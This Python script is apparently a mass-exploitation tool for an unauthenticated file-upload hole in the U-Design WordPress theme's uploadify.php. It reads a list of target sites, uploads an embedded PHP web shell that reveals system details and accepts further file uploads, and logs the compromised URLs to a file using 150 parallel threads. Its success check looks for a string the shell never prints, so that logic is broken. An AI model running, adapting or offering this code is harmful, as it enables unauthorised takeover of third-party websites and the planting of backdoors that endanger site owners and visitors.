import requests
import sys
import re
import random, string
from multiprocessing.dummy import Pool
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init												
init(autoreset=True)

fr  =   Fore.RED																		
fg  =   Fore.GREEN
fc  =   Fore.CYAN					

def ran(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))
   
   
def URL(url):
	if url[-1] == "/":
		pattern = re.compile('(.*)/')
		site = re.findall(pattern,url)
		url = site[0]
	if url[:7] != "http://" and url[:8] != "https://":
		url = "http://" + url
	return url 

print """  
[#] Author : @RoxyPr


					       /\
					      /  \
					     /\ \ \
					    /\ \ \ \
					   /\ \ \ \/\
					  / /\ \ \/ /\
					 / / /\  / / /\
					/ / /  \/ / /  \
					\  / / /\  / / /
					 \/ / /  \/ / /
					  \/ /\ \ \/ /
					   \/\ \ \ \/
					    \ \ \ \/
					     \ \ \/
					      \  /
					       \/        


Join Channel:https://t.me/The_Hell_13      
 		BackDoor Finder 
"""

shell = """<<?php echo 'RxR HaCkErs'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>""" 

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
	path =  str(sys.argv[0]).split('\\')
	exit('\n  [!] Enter <'+path[len(path)-1] + '> <sites.txt>')


def exploit(site):
	try :	
		url = site.strip()
		url = URL(url)
		if len(requests.get(url+'/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php',timeout=15).content) == 0 :
			filenames = ran(10)+'.php'
			up = {'Filedata':(filenames, shell, 'text/html')}
			exploit = requests.post(url+'/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php', files=up,timeout=90)
			check = requests.get(url+'/'+filenames,timeout=15)
			if 'AnonymousFox' in check.content:
				open('Shells.txt', 'a').write(url+'/'+filenames+'\n')
				print " [+] "+url+"  ====> {}Success upload".format(fg)
				print " [$] Shell : {}{}/{}\n".format(fc,url,filenames)
			else:
				print " [-] "+url+"  ====> {}Failed upload".format(fr)
		else :
			print " [-] "+url+"  ====> {}No Vulnerability".format(fr)
	except :
		print " [-] "+url+"  ====> {}Time Out\n".format(fr)
		
		
mp = Pool(150)
mp.map(exploit, target)
mp.close()
mp.join()			